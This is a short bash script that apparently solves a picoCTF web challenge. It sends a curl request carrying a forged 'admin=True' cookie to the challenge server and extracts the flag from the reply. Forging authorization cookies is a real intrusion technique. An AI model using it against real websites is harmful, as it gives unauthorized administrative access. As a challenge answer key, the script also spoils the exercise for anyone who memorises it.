#!/bin/bash

curl -s -H "Cookie: admin=True; time=1400" "https://jupiter.challenges.picoctf.org/problem/51400/flag" | grep --color=none -oE "picoCTF{.*}"
